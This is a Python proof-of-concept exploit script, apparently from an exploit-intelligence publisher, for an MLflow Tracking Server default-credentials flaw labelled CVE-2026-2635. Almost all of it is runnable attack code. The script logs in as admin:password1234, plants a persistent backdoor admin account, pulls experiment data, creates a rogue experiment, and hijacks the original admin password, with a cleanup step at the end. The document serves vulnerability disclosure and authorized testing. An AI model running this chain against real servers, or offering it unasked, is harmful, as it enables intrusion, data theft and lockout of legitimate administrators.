#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : MLflow Default Credentials — Persistence & Full Compromise
# CVE            : CVE-2026-2635
# Vendor         : MLflow (Databricks)
# Product        : MLflow Tracking Server
# Affected       : v2.3.0 – v3.10.0+ (with --app-name basic-auth)
# Type           : CWE-1393 - Use of Default Credentials
# CVSS           : 9.8 (Critical)
# Platform       : Python / Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-28
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2026-2635 Vector 2: Persistence & Full Compromise

Demonstrates the full attack chain after gaining admin access via default
credentials: backdoor creation, data exfiltration, rogue experiment injection,
and admin account hijacking.

ATTACK CHAIN:
  1. Authenticate with default credentials (admin:password1234)
  2. Create backdoor admin user for persistent access
  3. Verify backdoor can authenticate independently
  4. Exfiltrate experiment data via backdoor account
  5. Create rogue experiment (ML supply chain risk)
  6. Change admin password (availability impact / lockout)

PREREQUISITES:
  - MLflow server with --app-name basic-auth enabled
  - Network access to MLflow tracking server (default port 5000)
  - Python 3.6+ (stdlib only, no external dependencies)

REFERENCES:
  - CVE-2026-2635
  - https://www.zerodayinitiative.com/advisories/ZDI-26-111/
"""

import sys
import json
import base64
import urllib.request
import urllib.error
import time

DEFAULT_USERNAME = "admin"
DEFAULT_PASSWORD = "password1234"

RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"


def make_request(url, method="GET", data=None, headers=None, auth=None, timeout=10):
    """Send an HTTP request using urllib (stdlib only)."""
    if headers is None:
        headers = {}
    if auth:
        cred = base64.b64encode(f"{auth[0]}:{auth[1]}".encode()).decode()
        headers["Authorization"] = f"Basic {cred}"
    if data is not None and isinstance(data, dict):
        data = json.dumps(data).encode("utf-8")
        headers.setdefault("Content-Type", "application/json")
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read().decode("utf-8", errors="replace")
            try:
                return resp.status, json.loads(body), None
            except json.JSONDecodeError:
                return resp.status, {"raw": body}, None
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace") if e.fp else ""
        try:
            return e.code, json.loads(body), None
        except json.JSONDecodeError:
            return e.code, {"raw": body}, None
    except urllib.error.URLError as e:
        return None, None, str(e.reason)
    except Exception as e:
        return None, None, str(e)


def exploit(target_host, target_port):
    """Demonstrate persistence, data exfiltration, and integrity impact."""

    base_url = f"http://{target_host}:{target_port}"
    auth = (DEFAULT_USERNAME, DEFAULT_PASSWORD)
    results = {"steps": [], "success": False}
    backdoor_user = "mlflow_backdoor"
    backdoor_pass = "b4ckd00r_p4ss!"

    print(f"{BOLD}{CYAN}╔══════════════════════════════════════════════════════════════╗")
    print(f"║  CVE-2026-2635 — Vector 2: Persistence & Full Compromise   ║")
    print(f"╚══════════════════════════════════════════════════════════════╝{RESET}\n")
    print(f"Target: {base_url}\n")

    # ─── Step 1: Verify initial admin access ─────────────────────────────
    print(f"{BOLD}[Step 1]{RESET} Verifying admin access with default credentials ...")
    status, body, err = make_request(
        f"{base_url}/api/2.0/mlflow/users/get?username={DEFAULT_USERNAME}",
        auth=auth
    )
    if status != 200:
        print(f"  {RED}[FAIL]{RESET} Cannot authenticate — HTTP {status}. Is auth enabled?")
        return results
    print(f"  {GREEN}[OK]{RESET}   Admin access confirmed")
    results["steps"].append(("init_auth", "PASS", "Admin access verified"))

    # ─── Step 2: Create backdoor admin user (Persistence) ────────────────
    print(f"\n{BOLD}[Step 2]{RESET} Creating backdoor admin user for persistent access ...")

    # Create user
    status, body, err = make_request(
        f"{base_url}/api/2.0/mlflow/users/create",
        method="POST",
        data={"username": backdoor_user, "password": backdoor_pass},
        auth=auth
    )
    if status == 200:
        new_id = body.get("user", {}).get("id", "?")
        print(f"  {GREEN}[OK]{RESET}   Created user '{backdoor_user}' (ID: {new_id})")
    elif status == 409 or "RESOURCE_ALREADY_EXISTS" in str(body):
        print(f"  {YELLOW}[INFO]{RESET} User already exists, continuing ...")
    else:
        print(f"  {RED}[FAIL]{RESET} User creation failed: HTTP {status}")
        results["steps"].append(("persistence", "FAIL", f"HTTP {status}"))
        return results

    # Grant admin
    status, body, err = make_request(
        f"{base_url}/api/2.0/mlflow/users/update-admin",
        method="PATCH",
        data={"username": backdoor_user, "is_admin": True},
        auth=auth
    )
    if status == 200:
        print(f"  {GREEN}[OK]{RESET}   Granted admin privileges to '{backdoor_user}'")
        results["steps"].append(("persistence", "PASS", f"Backdoor admin '{backdoor_user}' created"))
    else:
        print(f"  {YELLOW}[WARN]{RESET} Admin grant returned HTTP {status}")
        results["steps"].append(("persistence", "WARN", f"HTTP {status}"))

    # ─── Step 3: Verify backdoor works independently ─────────────────────
    print(f"\n{BOLD}[Step 3]{RESET} Verifying backdoor user can authenticate independently ...")

    backdoor_auth = (backdoor_user, backdoor_pass)
    status, body, err = make_request(
        f"{base_url}/api/2.0/mlflow/users/get?username={backdoor_user}",
        auth=backdoor_auth
    )
    if status == 200:
        is_admin = body.get("user", {}).get("is_admin", False)
        print(f"  {GREEN}[OK]{RESET}   Backdoor user authenticated successfully")
        print(f"         is_admin: {is_admin}")
        if is_admin:
            print(f"  {GREEN}[OK]{RESET}   Backdoor has full admin access — persistence established!")
            results["steps"].append(("backdoor_verify", "PASS", "Backdoor admin access confirmed"))
        else:
            print(f"  {YELLOW}[WARN]{RESET} Backdoor authenticated but not admin")
            results["steps"].append(("backdoor_verify", "WARN", "Not admin"))
    else:
        print(f"  {RED}[FAIL]{RESET} Backdoor authentication failed: HTTP {status}")
        results["steps"].append(("backdoor_verify", "FAIL", f"HTTP {status}"))

    # ─── Step 4: Exfiltrate all experiments via backdoor ─────────────────
    print(f"\n{BOLD}[Step 4]{RESET} Exfiltrating experiment data via backdoor user ...")

    status, body, err = make_request(
        f"{base_url}/api/2.0/mlflow/experiments/search",
        method="POST",
        data={"max_results": 1000},
        auth=backdoor_auth  # Using BACKDOOR credentials, not original admin
    )
    if status == 200:
        experiments = body.get("experiments", [])
        print(f"  {GREEN}[OK]{RESET}   Exfiltrated {len(experiments)} experiment(s) via backdoor account")
        for exp in experiments:
            print(f"         - [{exp.get('experiment_id')}] {exp.get('name')} "
                  f"(artifact: {exp.get('artifact_location', 'N/A')})")
        results["steps"].append(("exfiltrate", "PASS", f"{len(experiments)} experiments via backdoor"))
    else:
        print(f"  {YELLOW}[INFO]{RESET} Experiment search returned HTTP {status}")
        results["steps"].append(("exfiltrate", "INFO", f"HTTP {status}"))

    # ─── Step 5: Demonstrate integrity impact — create experiment ────────
    print(f"\n{BOLD}[Step 5]{RESET} Demonstrating integrity impact — creating rogue experiment ...")

    rogue_name = f"CVE-2026-2635-PoC-{int(time.time())}"
    status, body, err = make_request(
        f"{base_url}/api/2.0/mlflow/experiments/create",
        method="POST",
        data={"name": rogue_name},
        auth=backdoor_auth
    )
    created_exp_id = None
    if status == 200:
        created_exp_id = body.get("experiment_id", "?")
        print(f"  {GREEN}[OK]{RESET}   Created rogue experiment '{rogue_name}' (ID: {created_exp_id})")
        print(f"         An attacker could inject poisoned ML experiments/models")
        results["steps"].append(("integrity", "PASS", f"Rogue experiment {created_exp_id}"))
    else:
        print(f"  {YELLOW}[INFO]{RESET} Experiment creation returned HTTP {status}")
        results["steps"].append(("integrity", "INFO", f"HTTP {status}"))

    # ─── Step 6: Demonstrate availability impact — change admin password ─
    print(f"\n{BOLD}[Step 6]{RESET} Demonstrating availability impact — changing original admin password ...")

    new_admin_pass = "hijacked_password1234"
    status, body, err = make_request(
        f"{base_url}/api/2.0/mlflow/users/update-password",
        method="PATCH",
        data={"username": DEFAULT_USERNAME, "password": new_admin_pass},
        auth=auth  # Still using original admin creds (before password change)
    )
    password_changed = False
    if status == 200:
        password_changed = True
        print(f"  {GREEN}[OK]{RESET}   Admin password changed! Original admin is now locked out")
        print(f"         Attacker retains access via backdoor account")
        results["steps"].append(("availability", "PASS", "Admin password changed"))

        # Verify old password no longer works
        status2, _, _ = make_request(
            f"{base_url}/api/2.0/mlflow/users/get?username={DEFAULT_USERNAME}",
            auth=auth  # Old credentials
        )
        if status2 == 401:
            print(f"  {GREEN}[OK]{RESET}   Confirmed: original credentials no longer work (HTTP 401)")
        else:
            print(f"  {YELLOW}[INFO]{RESET} Old credentials returned HTTP {status2}")
    else:
        print(f"  {YELLOW}[INFO]{RESET} Password change returned HTTP {status}: {body}")
        results["steps"].append(("availability", "INFO", f"HTTP {status}"))

    # ─── Cleanup ─────────────────────────────────────────────────────────
    print(f"\n{BOLD}[Cleanup]{RESET} Restoring original state ...")

    # Use backdoor to restore admin password
    cleanup_auth = backdoor_auth if password_changed else auth
    if password_changed:
        status, _, _ = make_request(
            f"{base_url}/api/2.0/mlflow/users/update-password",
            method="PATCH",
            data={"username": DEFAULT_USERNAME, "password": DEFAULT_PASSWORD},
            auth=cleanup_auth
        )
        if status == 200:
            print(f"  {GREEN}[OK]{RESET}   Restored original admin password")
        else:
            print(f"  {RED}[WARN]{RESET} Could not restore admin password (HTTP {status})")

    # Delete rogue experiment
    if created_exp_id:
        status, _, _ = make_request(
            f"{base_url}/api/2.0/mlflow/experiments/delete",
            method="POST",
            data={"experiment_id": created_exp_id},
            auth=(DEFAULT_USERNAME, DEFAULT_PASSWORD)
        )
        if status == 200:
            print(f"  {GREEN}[OK]{RESET}   Deleted rogue experiment {created_exp_id}")

    # Delete backdoor user
    status, _, _ = make_request(
        f"{base_url}/api/2.0/mlflow/users/delete",
        method="DELETE",
        data={"username": backdoor_user},
        auth=(DEFAULT_USERNAME, DEFAULT_PASSWORD)
    )
    if status == 200:
        print(f"  {GREEN}[OK]{RESET}   Deleted backdoor user '{backdoor_user}'")
    else:
        print(f"  {YELLOW}[INFO]{RESET} Backdoor user deletion returned HTTP {status}")

    # ─── Summary ─────────────────────────────────────────────────────────
    passed = sum(1 for _, s, _ in results["steps"] if s == "PASS")
    total = len(results["steps"])
    results["success"] = passed >= 4

    print(f"\n{BOLD}{'═' * 62}{RESET}")
    if results["success"]:
        print(f"{BOLD}{GREEN}[FULL COMPROMISE]{RESET} CVE-2026-2635 — {passed}/{total} attack stages succeeded")
        print(f"""
{BOLD}Attack Chain Demonstrated:{RESET}
  1. {GREEN}✓{RESET} Initial access via default credentials
  2. {GREEN}✓{RESET} Persistence via backdoor admin account
  3. {GREEN}✓{RESET} Data exfiltration (experiments, artifacts)
  4. {GREEN}✓{RESET} Integrity impact (rogue experiment injection)
  5. {GREEN}✓{RESET} Availability impact (admin password hijack / lockout)

{BOLD}Real-world Impact:{RESET}
  • ML supply chain compromise (poisoned models/artifacts)
  • Data theft (experiment results, proprietary ML data)
  • Complete denial of service to legitimate users
  • Persistent access surviving admin password changes
""")
    else:
        print(f"{BOLD}{RED}[PARTIAL]{RESET} Only {passed}/{total} attack stages succeeded")

    return results


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 5000
    result = exploit(target, port)
    sys.exit(0 if result["success"] else 1)
